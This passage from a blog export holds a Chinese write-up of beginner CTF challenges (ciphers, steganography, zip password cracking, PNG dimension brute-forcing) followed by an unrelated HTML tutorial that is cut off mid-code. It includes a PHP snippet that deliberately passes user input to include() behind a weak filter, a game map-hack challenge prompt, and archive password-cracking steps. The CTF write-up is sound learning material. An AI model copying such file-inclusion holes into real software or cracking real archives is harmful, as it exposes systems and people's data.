<p><img src="https://i.loli.net/2021/08/16/JjBqbcYu4tSeZCR.png" alt="image-20210816170929174"></p>
<h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="密码1"><a href="#密码1" class="headerlink" title="密码1"></a>密码1</h2><p>密文：</p>
<p>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</p>
<p><a href="https://www.bejson.com/convert/ox2str/">十六进制到文本字符串</a></p>
<p><img src="https://i.loli.net/2021/08/17/37tyQmEvxOznSMe.png" alt="image-20210817123630323"></p>
<p>再 base64 解码</p>
<p>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</p>
<p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码解码</a></p>
<p><img src="https://i.loli.net/2021/08/17/EIhugz4SwcoKYAH.png" alt="image-20210817123823370"></p>
<h2 id="密码2"><a href="#密码2" class="headerlink" title="密码2"></a>密码2</h2><p>出题人已累，随便敲了几下键盘。。。 rdcvbg 2qase3 6tghu7</p>
<p>rdcvbg 2qase3 6tghu7</p>
<p>​    f             w            y</p>
<p>三组，包围</p>
<p>KEY{fwy}</p>
<h2 id="密码3"><a href="#密码3" class="headerlink" title="密码3"></a>密码3</h2><p>题目名称：我想吃培根 题目描述： – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. – </p>
<p>格式：flag{***********}</p>
<p><a href="http://moersima.00cha.net/">摩斯密码解密</a></p>
<p><img src="https://i.loli.net/2021/08/17/Wu86T7wcbpKENGS.png" alt="image-20210817124449077"></p>
<p>得到  mmddmdmdmmmdddmdmddmmmmmmmddmdmmddm</p>
<p>将 m 替换成 A，d 替换成 B  ，AABBABABAAABBBABABBAAAAAAABBABAABBA</p>
<p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码解密</a></p>
<p><img src="https://i.loli.net/2021/08/17/LYK8a6bdl7PXJCV.png" alt="image-20210817124828352"></p>
<h2 id="密码-4"><a href="#密码-4" class="headerlink" title="密码#4"></a>密码#4</h2><p>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</p>
<p>base64 得到 Ao(mgHX^E)ARAnTF(J]f@&lt;6”.</p>
<p>然后 <a href="http://ctf.ssleye.com/base85.html">base85</a></p>
<p><img src="https://i.loli.net/2021/08/17/oYHs4R3jJpMWIAv.png" alt="image-20210817125211103"></p>
<h2 id="隐写1"><a href="#隐写1" class="headerlink" title="隐写1"></a>隐写1</h2><p>下载到本地，打不开</p>
<p>010 查看，文件头损坏</p>
<p><img src="https://i.loli.net/2021/08/17/P4ovewZGTFLhA2I.png" alt="image-20210817181956643"></p>
<p>更改为 89 后保存，打开即可</p>
<h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>下载工具，打开图片，点击 Seek ，密码为空，保存，得到所解出的密文</p>
<p><img src="https://i.loli.net/2021/08/17/or8TfdwiM2mlnUY.png" alt="image-20210817183021842"></p>
<h2 id="萌新-隐写2-—-zip-伪加密-ziperello-暴力破解"><a href="#萌新-隐写2-—-zip-伪加密-ziperello-暴力破解" class="headerlink" title="萌新 隐写2 — zip 伪加密 ziperello 暴力破解"></a>萌新 隐写2 — zip 伪加密 ziperello 暴力破解</h2><p><img src="https://i.loli.net/2021/08/17/lGEF96pw4gOLsfh.png" alt="image-20210817183327452"></p>
<p>zip 伪加密 ziperello 工具</p>
<p><img src="https://i.loli.net/2021/08/17/PDVweJF4S86xgUA.png" alt="image-20210817184618928"></p>
<p><img src="https://i.loli.net/2021/08/17/H6Cgfo5kdBIj9wu.png" alt="image-20210817184906246"></p>
<p>伪加密是09，这里是01，是真有密码。</p>
<h2 id="萌新-隐写3"><a href="#萌新-隐写3" class="headerlink" title="萌新 隐写3"></a>萌新 隐写3</h2><p><img src="https://i.loli.net/2021/08/17/gkKmvdftDxL9Wze.png" alt="image-20210817185117999"></p>
<h2 id="萌新-隐写4-—-doc"><a href="#萌新-隐写4-—-doc" class="headerlink" title="萌新 隐写4 — .doc"></a>萌新 隐写4 — .doc</h2><p><img src="https://i.loli.net/2021/08/17/UOcV19hzEuKBLg3.png" alt="image-20210817185432792"></p>
<p>打开之后，可以看见存在换行，在 word 选项中设置 显示隐藏文字</p>
<p><img src="https://i.loli.net/2021/08/17/TbIxswakcjGznpg.png" alt="image-20210817185525227"></p>
<p><img src="https://i.loli.net/2021/08/17/9BRSyYAtN8LKFhg.png" alt="image-20210817185557410"></p>
<h2 id="萌新-隐写5"><a href="#萌新-隐写5" class="headerlink" title="萌新 隐写5"></a>萌新 隐写5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀\\=。=//</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/17/bIjpZQl4BOWaeNG.png" alt="image-20210817185848751"></p>
<p><img src="https://i.loli.net/2021/08/17/W5IjJqcSChwnm9d.png" alt="image-20210817185922758"></p>
<p>MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</p>
<p>base32</p>
<h2 id="萌新6-—-flac-音频-—-audacity-工具"><a href="#萌新6-—-flac-音频-—-audacity-工具" class="headerlink" title="萌新6 — .flac 音频 — audacity 工具"></a>萌新6 — .flac 音频 — audacity 工具</h2><p><img src="https://i.loli.net/2021/08/17/bLpFINq2R8olt6x.png" alt="image-20210817201257731"></p>
<p>左声道 样子像 摩斯电码</p>
<p>将右声道设置为静音，提高音量，导出为 Mp3</p>
<p><img src="https://i.loli.net/2021/08/17/B9aT5KnhpHCqksz.png" alt="image-20210817201422588"></p>
<p>打开 <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">摩斯电码音频解码工具</a></p>
<p><img src="https://i.loli.net/2021/08/17/SE9HhpjF38Arywc.png" alt="image-20210817201634242"></p>
<p>有误差 ，答案是 flag{MUZIKISG00D}</p>
<h2 id="杂项1"><a href="#杂项1" class="headerlink" title="杂项1"></a>杂项1</h2><p>小明想给心爱的妹子表白很久，可是不知道怎么开口，你能帮帮小明吗？</p>
<p>已知 md5(表白的话+ctf)=ed400fbcff269bd9c65292a97488168a</p>
<p>提交flag{表白的话}</p>
<p><a href="https://cmd5.la/user/index.php">https://cmd5.la/user/index.php</a></p>
<p><img src="https://i.loli.net/2021/08/17/mMPvgeCLOqrRS7h.png" alt="image-20210817203719294"></p>
<h2 id="杂项2"><a href="#杂项2" class="headerlink" title="杂项2"></a>杂项2</h2><p><img src="https://i.loli.net/2021/08/17/IqzhFbQX72HYLCm.png" alt="image-20210817204057302"></p>
<h2 id="萌新-杂项3"><a href="#萌新-杂项3" class="headerlink" title="萌新 杂项3"></a>萌新 杂项3</h2><p>大家好我是小萌新羽，前不久我的一个朋友给我了一张银行卡，他说里面有一大笔钱，但是他只告诉我他的生日是九七年十月一日，你能帮我猜猜他的银行卡密码是多少吗，哦对，这个朋友有个小名叫小五。</p>
<p>flag格式：flag{银行卡密码}</p>
<p>flag{971015}</p>
<h2 id="杂项4"><a href="#杂项4" class="headerlink" title="杂项4"></a>杂项4</h2><p>小明心爱的图片在压缩包中，可是小明夜深人静的时候，孤枕难眠，想打开图片排遣寂寞，可是忘记了密码了，小米依稀记得9位的密码都是数字，前3位是372，你能帮助小明吗？</p>
<p>zip 压缩包 </p>
<ul>
<li>ziperello 直接爆破得到密码</li>
</ul>
<p><img src="https://i.loli.net/2021/08/17/QILvVmMF8zhdAS7.png" alt="image-20210817205231263"></p>
<ul>
<li>ARCHPR 掩码</li>
</ul>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205050082.png" alt="image-20210817205050082"></p>
<h2 id="杂项5"><a href="#杂项5" class="headerlink" title="杂项5"></a>杂项5</h2><p>小明如愿以偿的打开了压缩包，可是眼前的文字自己只能认识FBI，其他的都不认识，而且屏幕出现了一句话，你能帮小明找到这句话的意思吗？</p>
<p><img src="https://i.loli.net/2021/08/17/qudxZoKW1PXUjE9.png" alt="image-20210817205505223"></p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205640153.png" alt="image-20210817205640153"></p>
<h2 id="杂项6"><a href="#杂项6" class="headerlink" title="杂项6"></a>杂项6</h2><p>小明的压缩包又忘记密码了？他去电脑维修店去修，人家扔出来说这个根本就没有密码，是个假密码。小明懵了，明明有密码的啊，你能帮帮小明吗？</p>
<p>伪加密 ，将 09 替换成 00</p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210106625.png" alt="image-20210817210106625"></p>
<h2 id="杂项7"><a href="#杂项7" class="headerlink" title="杂项7"></a>杂项7</h2><p>小明小心翼翼的打开压缩包，竟然是个图片，什么鬼？</p>
<p>要是图片能继续往长一点该多好啊，小明暗暗的想。</p>
<p>你能帮小明完成这个朴素的梦想吗？</p>
<p>图片 SRC</p>
<p><img src="https://i.loli.net/2021/08/17/XHLgEo1clnfyOBs.png" alt="image-20210817210418869"></p>
<p>计算图片正确的宽和高</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0x889C2F07</span>:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210616232.png" alt="image-20210817210616232"></p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210714567.png" alt="image-20210817210714567"></p>
<h2 id="杂项8"><a href="#杂项8" class="headerlink" title="杂项8"></a>杂项8</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">k=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(5000):</span><br><span class="line">    <span class="keyword">if</span> k==1:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        <span class="keyword">if</span> crc == 0x889C2F07:</span><br><span class="line">            k = 1</span><br><span class="line">            <span class="built_in">print</span>(hex(i),hex(j))</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure>

<p>和杂项7一样，修改正确的宽高</p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817211616036.png" alt="image-20210817211616036"></p>
<h2 id="杂项9-—-链接失效-—-过"><a href="#杂项9-—-链接失效-—-过" class="headerlink" title="杂项9 — 链接失效 — 过"></a>杂项9 — 链接失效 — 过</h2><p>题目地址： 链接: <a href="https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA">https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA</a> 提取码: fcg3</p>
<p>要求：写一个本地外挂，小地图显示全图。</p>
<p>提示：游戏版本1.24E，修改game.dll</p>
<p>提交小地图全图基址即可。例如：flag{0xxxxxxx}</p>
<h2 id="杂项10"><a href="#杂项10" class="headerlink" title="杂项10"></a>杂项10</h2><p><img src="https://i.loli.net/2021/08/17/WkIsNA3Zd9oYrvD.png" alt="image-20210817212449610"></p>
<p>摘掉眼镜，仔细看图片</p>
<p>flag{我好喜欢你}</p>
<h2 id="杂项11"><a href="#杂项11" class="headerlink" title="杂项11"></a>杂项11</h2><p>密码为空，提取文件得到 1.jpg，一个二维码</p>
<p><img src="https://i.loli.net/2021/08/17/8oLmaJEkfY1U2yW.png" alt="image-20210817212951757"></p>
<p>使用 二维码扫描工具扫描，得到</p>
<p><img src="https://i.loli.net/2021/08/17/mInpy7OwPF9chWV.png" alt="image-20210817213220467"></p>
<p>base64 解码得到</p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础全</title>
    <url>/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="HTML-创建站点-–-环境：VScode"><a href="#HTML-创建站点-–-环境：VScode" class="headerlink" title="HTML 创建站点 – 环境：VScode"></a>HTML 创建站点 – 环境：VScode</h2><p><strong>创建站点</strong>：包含基本文件<br><img src="https://img-blog.csdnimg.cn/20210109140819801.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109140831761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>VScode 配置</strong></p>
<p><strong>插件安装：</strong><br><img src="https://img-blog.csdnimg.cn/20210109141233418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>插件<br><img src="https://img-blog.csdnimg.cn/20210109141124299.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210109141134688.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109141149567.png" alt="在这里插入图片描述"><br><strong>将文件夹添加至工作区：</strong></p>
<p>文件 – 将文件夹添加到工作区 – 选择文件夹<br><img src="https://img-blog.csdnimg.cn/20210109141811698.png" alt="在这里插入图片描述"><br><strong>新建 html 文档 ：</strong></p>
<p>工作区选中文件夹中，Ctrl + N –&gt; Ctrl + S –&gt; 设置文件夹名，后缀为 .html 或者 .htm</p>
<h2 id="HTML基本架构："><a href="#HTML基本架构：" class="headerlink" title="HTML基本架构："></a>HTML基本架构：</h2><p>先输入一个 ! 号，然后按一下 Tab 键即可<br><img src="https://img-blog.csdnimg.cn/20210109142316620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>基本架构理解</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20210109144116916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="HTML（二）-概述-常用标签-转义字符"><a href="#HTML（二）-概述-常用标签-转义字符" class="headerlink" title="HTML（二） 概述+常用标签+转义字符"></a>HTML（二） 概述+常用标签+转义字符</h2><p><strong>(HyperText Markup Language)–超文本标记语言</strong></p>
<p>1.用于编写网页，是一种<strong>解释型</strong>(写出来的代码即可直接进行运行,不需要编译)的语言<br>2.其源文件是纯文本的，放在web根目录之下<br>3.HTML是一种 <strong>标记语言</strong>，后缀名为  <strong>.html</strong>  或者是 <strong>.htm</strong><br>4.语法构成：<strong>标签+属性</strong>，即尖括号后开头为<strong>标签</strong>，标签中可设置 <strong>属性</strong> 以及 <strong>属性值</strong>，<br>属性值放于引号中，不同属性用空格隔开<br>5.HTML的运行环境是 <strong>浏览器</strong><br>6.<strong>注释</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">注释的内容</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>拓展：<br>1.C语言源代码–&gt;<strong>编译</strong>–&gt;二进制文件–&gt;计算机解释执行<br>Java同上<br>2.HTML标签分为：单标签(空标签，没有结束标签)，双标签(成对出现)</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">导入 CSS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;**.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">导入 JS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/**.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">CSS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span>嵌入css样式代码<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">JS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>...<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>文本标签</strong></p>
<p><strong>标题标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>     特点:其样式均为默认状态，即文本大小的设置，以及加粗设置</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span> <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span> <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span> <span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span> <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">h1</span>&gt;&lt;/<span class="selector-tag">h1</span>&gt;标签在一个网页中最好只用一次</span><br><span class="line"><span class="number">2</span>.这六个标题标签不能互相嵌套</span><br></pre></td></tr></table></figure>
<p><strong>文本相关设置标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>        倾斜</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span>	   强调斜体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>        加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span>        下划线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span>    下标</span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span>    上标</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        段落</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>  字符 或 小段文本 标签，是 行内元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>          一个块，作容器，用于网页布局，是 块级元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>  字体设置  </span><br><span class="line">    size</span><br><span class="line">    color</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span>         水平线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>         换行</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span>	   删除线</span><br><span class="line"> </span><br><span class="line">A<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>	下标</span><br><span class="line">    </span><br><span class="line">B<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>	上标</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">p</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;标签中不能嵌套标题标签</span><br></pre></td></tr></table></figure>
<blockquote>
<p>扩展：**&lt; span &gt;与&lt; div &gt;**<br><strong>行内元素</strong>：一个行内元素只占据它对应标签的边框所包含的空间<br><strong>块级元素</strong>：块级元素占据其父元素（容器）的整个空间，创建了一个“<strong>块</strong>”，一般浏览器会在块级元素后另起一个新行。</p>
</blockquote>
<p><strong>超链接</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  属性：</span><br><span class="line">         href=&quot;&quot;   跳转的路径</span><br><span class="line">         target=&quot;&quot;，属性值：</span><br><span class="line">				_self(默认值，覆盖当前页面)；</span><br><span class="line">				_blank(将会新弹出一个窗口)</span><br><span class="line">				_parent 父窗口</span><br><span class="line">				_top  顶级窗口</span><br><span class="line">				_framename  窗口名</span><br><span class="line">         title=&quot;&quot;  提示信息</span><br><span class="line">         rel=&quot;nofollow&quot;</span><br></pre></td></tr></table></figure>
<p>扩展</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">空链接         &lt;<span class="selector-tag">a</span> href=&quot;#&quot;&gt;&lt;/<span class="selector-tag">a</span>&gt;   </span><br><span class="line"><span class="selector-tag">a</span> 模拟按钮     &lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">void</span>(<span class="number">0</span>)<span class="string">&quot;&gt;按钮&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>img 标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>    属性：</span><br><span class="line">         src=&quot;&quot;   图片路径</span><br><span class="line">         alt=&quot;&quot;   当图片未正常加载出来时，将会显示alt中的文本替换图片 </span><br><span class="line">                  利于SEO优化，由于搜索引擎无法读取图片上面的文本</span><br><span class="line">         title=&quot;&quot; 提示信息</span><br><span class="line">         </span><br><span class="line">         width=&quot;&quot;  长</span><br><span class="line">         height=&quot;&quot; 宽</span><br><span class="line">         border=&quot;&quot; 边框</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line">绝对路径： http://www.baidu.com</span><br><span class="line">相对路径：<span class="number">1</span>.jpg  ./<span class="number">1</span>.jpg   当前</span><br><span class="line">        ./images/<span class="number">1</span>.jpg   下一级</span><br><span class="line">        ../i.jpg         上一级</span><br></pre></td></tr></table></figure>


<p><strong>特殊字符 (转义字符)：</strong><br>| 结果 | 实体名称 |<br>| —- | ——– |<br>| 空格 | &amp;nbsp    |<br>| &lt;    | &amp;lt      |<br>| &gt;    | &amp;gt      |<br>| &amp;    | &amp;amp     |<br>| “    | &amp;quot    |<br>| ‘    | &amp;apos    |<br>| ©    | &amp;copy    |</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如:输出  &lt;head&gt;    &amp;lt;head&amp;gt;</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>HTML实体</strong>：<br>一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体。分为ASCLL，符号实体，字符实体。</p>
</blockquote>
<p>多媒体标签，html5之后新增内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;./mus/1.mp3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">loop</span> <span class="attr">poster</span>=<span class="string">&quot;./images/linux.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./mus/back.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;movie.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="HTML（三）列表-与-表格"><a href="#HTML（三）列表-与-表格" class="headerlink" title="HTML（三）列表 与 表格"></a>HTML（三）列表 与 表格</h2><p><strong>HTML 列表</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>         无序列表：默认样式--实心列表符号</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span 